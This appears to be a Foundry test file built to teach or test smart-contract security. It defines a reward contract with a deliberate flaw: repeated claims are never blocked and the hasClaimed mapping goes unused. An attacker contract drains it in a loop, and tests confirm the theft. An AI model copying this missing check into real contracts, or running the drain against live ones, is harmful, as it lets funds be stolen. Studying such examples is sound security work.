pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contract with Wrong Logic vulnerability
// SPDX-License-Identifier: UNLICENSED
contract WrongLogicVulnerable {
    // mapping intended to track reward claim, but never used
    mapping(address => bool) public hasClaimed;
    
    uint public reward = 1 ether;
    
    // contract must be deployed with sufficient funds
    constructor() payable {}
    
    // Vulnerable function: no check to prevent repeated claims
    function claimReward() public {
        require(address(this).balance >= reward, "Insufficient balance");
        payable(msg.sender).transfer(reward);
    }
    
    // Fallback receive function
    receive() external payable {}
}

// Attacker contract that exploits the vulnerability by repeatedly claiming rewards
contract AttackWrongLogic {
    WrongLogicVulnerable public vulnerable;

    constructor(address payable _vulnerable) {
        vulnerable = WrongLogicVulnerable(_vulnerable);
    }

    // Attack function: repeatedly claim rewards
    function attack(uint iterations) public {
        for (uint i = 0; i < iterations; i++) {
            vulnerable.claimReward();
        }
    }

    // Withdraw all Ether from this contract to the caller
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}


// Forge test contract focusing on the vulnerability
contract VulnerabilityTest is Test {
    WrongLogicVulnerable vulnerable;
    AttackWrongLogic attacker;

    // Use a non-precompile address for the attacker
    address attackerAddress = address(0x1234);

    function setUp() public {
        // Ensure attacker address has sufficient balance
        vm.deal(attackerAddress, 100 ether);

        // Deploy the vulnerable contract with 6 ether, enough for 6 rewards
        vulnerable = new WrongLogicVulnerable{value: 6 ether}();
        
        // Deploy the attacker contract from attackerAddress
        vm.prank(attackerAddress);
        attacker = new AttackWrongLogic(payable(address(vulnerable)));
    }

    function testExploitDraining() public {
        // Have the attacker claim reward 6 times to drain the vulnerable contract
        vm.prank(attackerAddress);
        attacker.attack(6);

        // Verify that the vulnerable contract is drained
        assertEq(address(vulnerable).balance, 0, "Vulnerable contract is not drained");

        // Record attacker's balance before withdrawal
        uint initialBalance = attackerAddress.balance;

        // Withdraw funds from attacker contract back to attackerAddress
        vm.prank(attackerAddress);
        attacker.withdraw();

        // After withdrawal, attacker should have received 6 ether
        assertEq(attackerAddress.balance, initialBalance + 6 ether, "Attacker did not receive the correct reward");
    }

    function testInsufficientBalanceRevert() public {
        // Deploy a new vulnerable contract with insufficient funds (< 1 ether)
        WrongLogicVulnerable vulnerableSmall = new WrongLogicVulnerable{value: 0.5 ether}();

        // Use a non-precompiled address (e.g., 0x1337) to avoid issues with precompiles
        vm.prank(address(0x1337));
        vm.expectRevert("Insufficient balance");
        vulnerableSmall.claimReward();
    }
}
